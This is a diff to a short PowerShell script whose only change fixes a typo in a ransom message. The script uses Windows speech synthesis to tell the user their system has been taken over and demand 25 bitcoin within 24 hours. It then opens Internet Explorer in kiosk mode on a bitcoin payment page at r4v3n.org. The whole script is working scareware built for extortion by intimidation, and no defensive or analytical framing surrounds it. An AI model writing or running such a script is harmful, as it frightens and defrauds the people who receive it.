@@ -1,5 +1,5 @@
 Add-Type -AssemblyName System.speech;
 $speak = New-Object System.Speech.Synthesis.SpeechSynthesizer;
-$speak.Speak('I have taken over your system.  You are mine.  Ha Ha Ha Ha!  Wait, this is no laughing matter.  You must pay me 25 bitcoin within 24 hours or you will lose access to all of your files. This is will be your only warning.');
+$speak.Speak('I have taken over your system.  You are mine.  Ha Ha Ha Ha!  Wait, this is no laughing matter.  You must pay me 25 bitcoin within 24 hours or you will lose access to all of your files. This will be your only warning.');
 $speak -eq $null;
 Start-Process iexplore.exe -ArgumentList '-k https://r4v3n.org/rr/bitcoin.html'
